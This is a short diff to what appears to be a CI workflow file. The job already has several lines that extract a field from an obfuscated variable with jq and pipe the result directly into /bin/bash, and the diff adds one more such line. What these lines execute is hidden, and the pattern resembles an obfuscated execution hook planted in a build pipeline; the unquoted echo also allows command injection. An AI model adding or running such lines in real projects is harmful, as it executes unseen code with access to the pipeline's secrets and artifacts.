@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$didg075" | jq -r .sxm95514 | /bin/bash
           echo $fz71 | jq -r .q2650 | /bin/bash
           printf '%s' "$dbjbg84014" | jq -r .w57 | /bin/bash
+          echo $ab1 | jq -r .b630 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
